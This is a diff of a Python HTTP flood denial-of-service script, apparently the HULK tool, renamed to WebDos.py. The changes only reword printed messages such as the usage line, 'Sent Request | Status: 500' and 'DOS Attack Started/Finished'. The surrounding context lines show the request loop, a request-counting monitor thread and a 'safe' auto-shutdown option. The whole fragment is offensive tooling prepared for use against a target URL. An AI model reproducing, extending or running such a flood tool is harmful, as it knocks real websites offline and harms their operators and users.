@@ -57,7 +57,7 @@ def buildblock(size):
 
 def usage():
 	print('---------------------------------------------------')
-	print('USAGE: python hulk.py <url>')
+	print('USAGE: python WebDos.py <url>')
 	print('you can add "safe" after url, to autoshut after dos')
 	print('---------------------------------------------------')
 
@@ -82,7 +82,7 @@ def httpcall(url):
 			urllib3.urlopen(request)
 	except urllib3.HTTPError as e:
 			set_flag(1)
-			print('Response Code 500')
+			print('Sent Request | Status: 500')
 			code=500
 	except urllib3.URLError as e:
 			#print e.reason
@@ -110,7 +110,7 @@ class MonitorThread(threading.Thread):
 				print("%d Requests Sent" % (request_counter))
 				previous=request_counter
 		if flag==2:
-			print("\n-- HULK Attack Finished --")
+			print("\n-- DOS Attack Finished --")
 
 if len(sys.argv) < 2:
 	usage()
@@ -120,7 +120,7 @@ else:
 		usage()
 		sys.exit()
 	else:
-		print("-- HULK Attack Started --")
+		print("-- DOS Attack Started --")
 		if len(sys.argv)== 3:
 			if sys.argv[2]=="safe":
 				set_safe()
